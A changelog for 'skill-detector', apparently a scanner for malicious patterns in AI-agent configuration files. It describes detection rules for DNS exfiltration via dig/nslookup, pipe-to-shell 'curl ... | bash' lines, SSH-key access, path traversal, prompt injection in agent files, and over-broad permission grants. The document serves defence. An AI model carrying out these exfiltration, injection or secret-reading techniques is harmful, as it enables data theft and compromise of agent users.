- **SD-018 reworded and renamed** to "settings.json Redundant Deny Rule"
  (was "Subcommand Limit Bypass"). Deny still wins over allow in Claude
  Code, so a narrower `deny` next to a broader `allow` was never an actual
  bypass — it's a redundant deny that signals the allow is overbroad. The
  rule name, finding message, and remediation now say that instead of
  "bypass".
- **SD-004/SD-013 damping veto narrowed.** The shell-invocation veto used to
  cancel the documentary damping on a bare backtick or bare `>` anywhere on
  the line, which reintroduced the FP class for any Markdown-formatted
  threat-model doc (code-span-wrapped paths, `->` arrows in table rows). A
  backtick now only vetoes via the text it wraps (an imperative command
  span still fires; a path span doesn't), and a single `>` only vetoes when
  it's redirect-shaped (`>` followed by `~`, `./`, `/`, or `$`, not
  preceded by `-`) — `>>` still vetoes unconditionally.
- **SD-023 downgraded High → Medium; SD-018 rename above.** Registry
  checksum moved to `589619b6386d2c41` (severity and name are both part of
  the hashed rule metadata, ADR-0003).
- **SD-002 (prompt injection)** now also scans `.claude/commands/`,
  `.claude/agents/`, and skill content files, not just `SKILL.md`/`CLAUDE.md`.
- **SD-001** now scans fenced code blocks inside Markdown
  (`shellFencedLines()` gates the per-line scan to fence contents so prose
  outside a fence doesn't fire) and registers for `.zsh` and extensionless
  scripts, matching the agent-dir script discovery above. Fence scanning is
  restricted to fences tagged `bash`/`sh`/`zsh`/`shell`/`console`/`terminal`
  or untagged — fences tagged with a non-shell language (```` ```js ````,
  ```` ```jsx ````, ```` ```python ````, etc.) are skipped, so a JS/TS
  template literal like `` `Status: ${x}` `` in a code sample no longer
  reads as shell backtick command substitution.
- **Invisible-Unicode coverage** widened to detect the Unicode Tags block
  and bidi-override characters, and now emits one finding per affected line
  instead of one per invisible character (a line with multiple invisible
  characters used to produce a finding per character; it now collapses to
  one finding per line).
- **False-positive damping.** SD-004/SD-013 no longer flag prohibition
  guidance ("never touch `~/.ssh`") or documentary context (Markdown table
  rows, interrogative bullets) as Critical, with a shell-invocation guard so
  an imperative command smuggled into that same shape (piped through a
  table cell) still fires. SD-020 exempts harness-provided `$CLAUDE_*`
  hook variables (e.g. `$CLAUDE_PROJECT_DIR`) from the unquoted-variable
  check — they aren't attacker-controlled.
- Config cascading lookup now also accepts `.skill-detector.yml` (in
  addition to `.skill-detectorrc`, checked first), matching what the
  README has documented.

### Fixed
- Gitignore matching now matches a gitignored directory node by both
  `dirname` and `dirname/` forms — a trailing-slash mismatch previously let
  some gitignored directories slip through.

### Breaking
- **New exit code `3`** for tool errors (bad arguments, unreadable path,
  internal failure), distinct from `1` (findings below threshold) and `2`
  (at/above threshold). Previously tool errors exited `1`, indistinguishable
  from "findings, none above threshold" — a CI gate treating `1` as
  "findings exist" could not tell a scan failure from a clean-ish scan.
- **`--fail-on-axis` with an unknown/misspelled axis now errors** instead of
  silently doing nothing. CI configs with a typo'd axis name (e.g.
  `securty=B`) previously passed every scan unconditionally; they now fail
  fast with an "unknown axis" error.

### Known issues
- **SD-003** (path traversal) fires on ordinary in-package relative paths —
  roughly 60% of findings in the validation corpus are this false-positive
  class. A proper fix needs to distinguish traversal-shaped paths
  (`../../etc`) from same-package relative references and is deferred to
  its own design pass rather than bundled into this release.

---

## v0.4.0 — 2026-05-29

### Added
- **Triage seam (`pkg/triage`).** A pluggable `Verifier` interface the scanner
  can call to reclassify findings as `real_threat`, `benign_example` or
  `uncertain`. Verdicts are matched back to findings by `(RuleID, Line)`.
- Two inert implementations ship with the engine: `NoopVerifier` (returns
  `uncertain` for everything, leaving the deterministic result untouched) and
  `ScriptedVerifier` (a test double).
- `model.Finding.Triage` — a `*TriageVerdict` carrying classification,
  confidence, rationale and source. **Omitted from JSON when nil**, so
  un-triaged scans produce byte-identical output to v0.3.x.
- `scanner.Options.Verifier` and `scanner.Options.TriageTimeout`.

### Changed
- Axis grading now skips findings that triage has confidently classified as
  benign: `Finding.IsSuppressed()` is true at classification `benign_example`
  with confidence ≥ `model.TriageDemoteThreshold` (0.85).

### Why
- The engine deliberately ships **no** LLM-backed verifier. Adding one here
  would put an API key, a network call and a non-reproducible verdict into a
  CI-facing CLI. The LLM implementation lives in the hosted scanner
  (`skilltrust`), which supplies caching to keep results stable.

### Compatibility
- **Default behavior is unchanged.** With no verifier injected — which is every
  CLI invocation — the scanner takes the same path as v0.3.3 and emits the same
  JSON.
- Triage failures are conservative by construction: a verifier error or a
  timeout marks affected findings `uncertain` / `source: "unavailable"`, so a
  grade can never come out *weaker* because triage broke.
- Registry checksum at this tag: `f1dcffd63faabeb3` (23 rules).

---

## v0.3.3 — 2026-05-25

### Added
- **`SD-023` — `settings.json` Unrestricted Permission Grant** (HIGH,
  permission_hygiene axis). Flags a bare `"*"` in `permissions.allow` in
  `.claude/settings.json` / `settings.local.json`.

### Why
- A wildcard grant slipped past `SD-017`, `SD-018` and `SD-019`, all of which
  look for specific over-broad patterns rather than the total absence of a
  restriction. Caught in the production dogfood: a settings file granting `"*"`
  left `permission_hygiene` at grade A. With `SD-023` the same fixture now
  grades D.

### Compatibility
- New rule → the registry checksum moves. Repositories with a wildcard grant
  will see `permission_hygiene` drop.

---

## v0.3.2 — 2026-05-25

### Added
- **`SD-022` — DNS Exfiltration** (HIGH, security axis). Detects data
  exfiltration over DNS: `dig` / `nslookup` / `drill` / `resolvectl` / `host`
  combined with a dynamically built dotted hostname (`$(...)`, backticks, or a
  variable). Static lookups do not fire.
- **Per-commit recall tripwire** — `cmd/skill-detector/bench_recall_test.go`
  over `testdata/bench/`. Asserts a curated slice of known attacks still grades
  C/D/F, guarding against recall lost to pattern tightening.

### Why
- `SD-022` closes the only miss in the SP-7 validation benchmark: a DNS-channel
  exfiltration sample using `nslookup` plus base64-encoded environment variables
  and no HTTP at all. Recall on the headline pool moves 0.875 → 1.0. Both
  `semgrep` and raw grep scored 0.25 on the same set.

### Fixed
- GoReleaser targeted the pre-transfer `velzepooz` org, so release asset upload
  failed with a 307 after the repository moved. Now points at `skilltrust`. The
  Homebrew tap intentionally stays at `velzepooz/homebrew-tap`.

### Compatibility
- New rule → the registry checksum moves.

---

## v0.3.1 — 2026-05-21

### Changed
- `pkg/delta.findingKey` now uses `hash/fnv` (FNV-1a, 64-bit) instead of `crypto/sha256`. Behavior identical; the change signals that the hash is content-addressing only, not a cryptographic primitive. Hash output width widens from 12 to 16 hex chars — internal-only, no wire impact.

## v0.3.0 — 2026-05-21

### Added
- `pkg/delta` package — pure-function trust-score delta computation over two `model.ScanResult`s. Returns per-axis grade movement, finding diff, and axis-downgrade explanations.
- `skill-detector delta <base.json> <head.json>` CLI sub-command emitting JSON or markdown.

### Why
- Powers the new `skilltrust/scan-action@v1` GitHub Action's optional `delta: true` mode.
- Single source of truth for delta semantics shared by the Action and the skillmoss-go PR-comment bot (SP-4). skillmoss-go's `internal/prbot.ComputeDelta` becomes a thin adapter over `pkg/delta.Compute` in a paired refactor; render snapshots remain byte-identical.

---

## v0.2.1 — 2026-05-19

### Fixed

- **SD-007** no longer flags bare URLs inside `.md`, `.txt`, or `.rst` documentation files. The network-command (`curl`/`wget`/`nc`/`ncat`) and Python-requests branches continue to fire on those file types so real attack patterns (e.g., `curl ... | bash` instructions inside `CLAUDE.md`) are still caught. Documentation links such as `https://github.com/owner/repo.git` in `INSTALL.md` no longer produce high-severity false positives. Surfaced by the `skillmoss-go` SP-2 dogfood scan of `obra/superpowers`.

---

## v0.2.0 — 2026-05-19 (SP-1: Multi-Axis Engine)

### Scope (BREAKING vs v0.1.x)
- Scanner default behavior: walks only AI-agent configuration files
  (SKILL.md, CLAUDE.md, .claude/settings*.json, .mcp.json) plus
  arbitrary files inside .claude/, .codex/, .opencode/ dirs.
- Honors .gitignore at the scan root (best-effort; missing or
  malformed .gitignore is a no-op).
- Hardcoded skip-list: node_modules, vendor, dist, build, target,
  .next, .git — always skipped, regardless of .gitignore.
- New --scan-all flag bypasses scope tightening and .gitignore
  filtering. For migration or whole-repo audits.
- All 14 pre-SP-1 rules now gate by path; they previously fired on
  any file with a matching extension. This is a breaking change
  vs. v0.1.x default behavior. --scan-all + the rules' built-in
  path gating means walking more files won't reproduce v0.1.x
  output exactly.
- New dependency: github.com/sabhiram/go-gitignore (MIT, zero
  transitive deps).

### Added
- **Multi-axis trust score.** Every scan now emits four A–F grades:
  Security, Permission hygiene, Transparency, Quality. Rendered as
  a "Trust Score" block above the existing findings list.
- **7 new detection rules** covering the `.claude/` configuration
  surface previously not scanned:
  - `SD-015` — `claude_md.sql_injection_by_instruction` (LayerX disclosure, Mar 2026)
  - `SD-016` — `claude_md.comment_and_control` (2026 prompt-injection family)
  - `SD-017` — `settings_json.bash_curl_wildcard` (broad-shell permission grants)
  - `SD-018` — `settings_json.subcommand_limit_bypass` (Apr 2026 CVE shape)
  - `SD-019` — `settings_json.unsanctioned_hook` (out-of-repo hook commands)
  - `SD-020` — `hooks.shell_metacharacter_interpolation` (CVE-2025-59536 family)
  - `SD-021` — `mcp.external_domain_reach` (Trend Micro 2026)
- **New library packages**:
  - `pkg/axes` — `Axis` and `Grade` enums (wire-stable).
  - `pkg/grade` — pure aggregator `Grade(axis, findings) → AxisResult`
    using worst-finding-wins with per-axis caps.
- **CLI flags**:
  - `--fail-on-axis <axis>=<grade>` — repeatable. Exits 2 if axis
    grade is worse than threshold. Combines with `--fail-on`
    (worst wins).
  - `--strict-mcp` — raises `SD-021` from Medium to High.
  - `--axes-only` — emits Trust Score to stdout, findings to
    stderr. For shell pipelines and the PR-comment renderer in SP-4.
- **CVE reproducer fixtures** under `testdata/cve/` — minimal repos
  reproducing five named 2026 incidents. Used by
  `cmd/skill-detector/cve_repro_test.go` for both Go-API and
  binary-E2E smoke tests.
- **Scanner walks `.claude/`, `.codex/`, `.opencode/`** despite the
  general hidden-directory skip. Other hidden dirs (`.git`,
  `.next`, `node_modules`, etc.) continue to be skipped.

### Changed
- **`Rule` interface gains `Axis() axes.Axis` method**. All existing
  rule implementations now declare an axis. New invariant:
  `baseRule.newFinding` stamps `Finding.Axis = b.axis` so rule code
  cannot forget.
- **`model.Finding` gains `Axis` field** (`json:"axis,omitempty"`).
  Existing consumers continue to parse unchanged.
- **`model.ScanResult` gains `Axes map[axes.Axis]AxisResult`** field
  (`json:"axes,omitempty"`). Existing fields preserved.
- **Existing 6 rule groups** now declare axis assignments
  (`injection/supply_chain/exfiltration/integrity → security`;
  `misconfiguration/access_control → permission_hygiene`). No
  behavior change — only adds axis tag to every emitted Finding.
- **`registry.Checksum()` extended** to include per-rule axis and
  the canonical form of the grade package's cap table + rationale
  templates. Any tampering with rule registration, axis assignment,
  cap-table thresholds, or template strings now invalidates the
  pinned `expectedChecksum` ldflag.
- **Text reporter** prepends a Trust Score block above the existing
  findings list.
- **JSON reporter** emits the new `axes` map and per-finding `axis`
  field (additive).

### Compatibility
- Existing JSON consumers parsing the old shape continue to work —
  new fields are additive and use `omitempty`.
- Existing CLI users running `skill-detector .` see the same
  findings list plus a new Trust Score block above. No flag flip
  required.
- Homebrew tap distribution unchanged. GoReleaser flow unchanged.
- `expectedChecksum` ldflag value differs from v0.1 — release
  artifacts ship with the new value.

### Notes for downstream consumers
- `skillmoss-go` and `skilltrust/scan-action@v1` consumers should
  bump the `skill-detector` dependency to `v0.2.x`.
- Old rule IDs `SD-001..SD-014` are unchanged. New rule IDs are
  `SD-015..SD-021` (skipped `SD-007..SD-013` to avoid collision
  with the original plan numbers).

### Dogfood pass
An SP-1 release-candidate dogfood pass was run and logged internally.
Verdict: ship-as-is; pre-existing-rule FPs noted as SP-2 follow-up.

---
